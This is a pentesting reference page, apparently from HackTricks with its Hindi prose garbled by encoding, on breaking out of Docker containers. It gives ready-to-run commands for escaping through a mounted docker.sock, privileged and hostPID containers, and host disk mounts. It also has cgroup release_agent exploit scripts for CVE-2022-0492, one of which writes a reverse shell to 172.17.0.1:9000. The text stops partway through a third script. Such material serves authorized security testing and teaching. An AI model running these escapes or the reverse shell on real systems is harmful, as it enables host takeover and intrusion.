# Docker Breakout / рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдХреЛ рдЪрд▓рд╛рдПрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддрд╛ рд╣реИред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЬрд╛рдБрдЪ рдФрд░ рдЫреВрдЯ

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): рдпрд╣ рднреА **рдХрдВрдЯреЗрдирд░реЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): рдпрд╣ рдЙрдкрдХрд░рдг рдХрдВрдЯреЗрдирд░ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд **рдЙрдкрдпреЛрдЧреА рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЫреВрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рднреА рдХрд░ рд╕рдХрддрд╛ рд╣реИ**
* [**amicontained**](https://github.com/genuinetools/amicontained): рдЗрд╕реНрддреЗрдорд╛рд▓реА рдЙрдкрдХрд░рдг рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рддрд╛рдХрд┐ рдЗрд╕рд╕реЗ рдЫреВрдЯрдиреЗ рдХреЗ рддрд░реАрдХреЗ рдвреВрдВрдврд╝ рд╕рдХреЗрдВ
* [**deepce**](https://github.com/stealthcopter/deepce): рдХрдВрдЯреЗрдирд░реЛрдВ рдХреА рдЬрд╛рдБрдЪ рдФрд░ рдЫреВрдЯ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг
* [**grype**](https://github.com/anchore/grype): рдЫрд╡рд┐ рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдореЗрдВ рдореМрдЬреВрдж CVEs рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

## рдорд╛рдЙрдВрдЯреЗрдб рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдЫреВрдЯ

рдпрджрд┐ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдорд╛рдЙрдВрдЯ рд╣реЛ рд░рд╣рд╛ рд╣реИ** рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдЫреВрдЯ рд╕рдХреЗрдВрдЧреЗред\
рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рдбреЙрдХрд░ рдбреЗрдорди рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рд╕рд╛рдорд╛рдиреНрдп рдбреЙрдХрд░ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдбреАрдорди рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
рдпрджрд┐ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд╕реНрдерд╛рди рдкрд░ рд╣реИ** рддреЛ рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдЕрднреА рднреА рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **`docker`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **`-H unix:///path/to/docker.sock`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде
{% endhint %}

рдбреЙрдХрд░ рдбреЗрдорди рдПрдХ рдкреЛрд░реНрдЯ рдореЗрдВ рднреА рд╕реБрди рд░рд╣рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ 2375, 2376) рдпрд╛ рд╕рд┐рд╕реНрдЯрдордб рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, рдбреЙрдХрд░ рдбреЗрдорди рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж fd:// рд╕реЙрдХреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="info" %}
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдиреНрдп рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рд░рдирдЯрд╛рдЗрдо рдХреЗ рд░рдирдЯрд╛рдЗрдо рд╕реЙрдХреЗрдЯ рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities рджреБрд░реБрдкрдпреЛрдЧ рдЫреБрдЯрдХрд╛рд░рд╛

рдЖрдкрдХреЛ рдХрдВрдЯреЗрдирд░ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП, рдпрджрд┐ рдЗрд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдЫреБрдЯрдХрд╛рд░рд╛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

рдЖрдк **рдкрд╣рд▓реЗ рд╕реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдгреЛрдВ** рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
capsh --print
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░ рдЖрдк **рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЫреЛрдбрд╝рдиреЗ/рдЙрдиреНрдирдпрди рдХрд░рдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ

рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдХрдВрдЯреЗрдирд░ `--privileged` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рд╡рд┐рд╢реЗрд╖ рд░рдХреНрд╖рд╛рдУрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдХреЗ:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

`--privileged` рдлреНрд▓реИрдЧ рдореЗрдВ рдмрдбрд╝реА рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЗрд╕ рд╢реЛрд╖рдг рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ рдЬреЛ рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рд╕рднреА рдЙрдкрдХрд░рдгреЛрдВ рддрдХ рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ seccomp, AppArmor рдФрд░ рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рд╕реАрдорд╛рдУрдВ рд╕реЗ рд╡рдВрдЪрд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЖрдк рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ `--privileged` рдХреЗ рд╕рднреА рдкреНрд░рднрд╛рд╡ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд + hostPID

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк рд╕реАрдзреЗ **рдореВрд▓ рдореЗрдВ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ init (pid:1) рдмрд╕ рдЗрд╕реЗ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

рдЗрд╕реЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ рдЬреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА

рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдЖрдк рдореЗрдЬрдмрд╛рди рдХреА рдбрд┐рд╕реНрдХ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рд░рд┐рд▓реАрдЬ_рдПрдЬреЗрдВрдЯ рдпрд╛ рдЕрдиреНрдп рднрдЧреЛрдбрд╝рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмрд╛рдЗрдкрд╛рд╕ рдХреЛ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### рдбрд┐рд╕реНрдХ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ - Poc1

рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реНрд╕ **fdisk -l** рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХреЛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ `--privileged` рдпрд╛ `--device=/dev/sda1` рдлрд╝реНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдЧрд▓рдд рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдорд╛рдВрдб рд╣реЛ, рддреЛ рд╣реЛрд╕реНрдЯ рдбреНрд░рд╛рдЗрд╡ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

рдЗрд╕рд▓рд┐рдП, рд╣реЛрд╕реНрдЯ рдорд╢реАрди рдкрд░ рдХрд╛рдмрд┐рдЬрд╝ рд╣реЛрдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
рдФрд░ рд╡рд╣рд╛рдВ! рдЕрдм рдЖрдк рдореЗрдЬрдмрд╛рди рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `/mnt/hola` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдорд╛рдЙрдВрдЯ рд╣реЛ рдЧрдпрд╛ рд╣реИред

#### рдбрд┐рд╕реНрдХ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ - Poc2

рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рдореЗрдВ рдЖрдХреНрд░рдордг рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╡реНрдпрдХреНрддрд┐ рдХреНрд▓рд╕реНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп hostPath рд╡реЙрд▓реНрдпреВрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореВрд▓ рд╣реЛрд╕реНрдЯ рдУрдПрд╕ рддрдХ рдФрд░ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдиреАрдЪреЗ рдХреБрдЫ рдЖрдо рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛рд╡рд░реНрдзрдХ рд╡реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВ:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЫреВрдЯ: рдореМрдЬреВрджрд╛ release\_agent рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="рдкреНрд░рд╛рд░рдВрднрд┐рдХ PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### рдирд┐рд╣рд┐рдд рдЫреВрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд┐рдд release_agent рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="рджреВрд╕рд░рд╛ PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

рдЗрд╕ рддрдХрдиреАрдХ рдХреА **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рджреА рдЧрдИ рд╣реИ:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### рдЬреНрдЮрд╛рдд рд░рд╛рд╕реНрддреЗ рдХреЗ рдмрд┐рдирд╛ release\_agent рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЫреВрдЯ - PoC3

рдкрд┐рдЫрд▓реЗ рдЕрдкрд░рд╛рдзреЛрдВ рдореЗрдВ **рдореЗрдЬрдмрд╛рди рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдкреВрд░реНрдг рдкрде рдЙрдЬрд╛рдЧрд░ рд╣реЛрддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╣рдореЗрд╢рд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ **рдореЗрдЬрдмрд╛рди рдХреЗ рдЕрдВрджрд░ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдкреВрд░реНрдг рдкрде рдирд╣реАрдВ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ**, рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

